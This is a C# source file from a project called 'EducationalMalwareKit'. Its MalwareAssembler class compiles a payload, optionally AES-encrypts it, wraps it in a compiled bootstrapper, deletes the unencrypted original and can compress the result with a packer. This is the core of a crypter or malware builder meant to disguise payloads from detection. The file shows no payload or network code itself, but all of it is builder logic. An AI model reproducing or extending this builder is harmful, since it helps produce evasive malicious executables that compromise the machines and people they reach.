using System.Diagnostics;
using System.IO;
using EducationalMalwareKit.Assembler.Encryption;
using EducationalMalwareKit.Domain.Build;

namespace EducationalMalwareKit.Assembler
{
    public static class MalwareAssembler
    {
        public static void AssembleMalwareBuild(MalwareBuild malwareBuild)
        {
            var sourceCode = TemplateHandler.PrepareTemplate(malwareBuild);

            FileHandler.CopyPayloadToWorkingDir(malwareBuild);
            FileHandler.SetDependencyPaths(malwareBuild);

            CommandLineHandler.Init(malwareBuild).CompilePayload();

            var payloadPath = Path.Combine(malwareBuild.WorkingDir, malwareBuild.PayloadFileName);

            if (malwareBuild.UserOptions.EncryptPayload)
            {
                var encryptedPayloadPath =
                    SimpleAES.EncryptFile
                    (
                        payloadPath,
                        malwareBuild.UserOptions.EncryptionKeyBytes,
                        malwareBuild.UserOptions.EncryptionSaltBytes
                    );

                malwareBuild.CompiledPayloadPath = encryptedPayloadPath;
            }
            else
            {
                malwareBuild.CompiledPayloadPath = payloadPath;
            }

            FileHandler.WriteMainClassToFileAsync(malwareBuild, sourceCode);
            CommandLineHandler.Init(malwareBuild).CompileBootstrapper();

            File.Delete(payloadPath);
        }

        public static void CleanWorkingDir(MalwareBuild malwareBuild)
        {
            FileHandler.CleanDirectory(malwareBuild.WorkingDir, ".exe");
        }

        public static void CompressExecutable(MalwareBuild malwareBuild, string packagerPath)
        {
            CommandLineHandler.Init(malwareBuild).PackageExecutable(packagerPath);
        }
    }
}
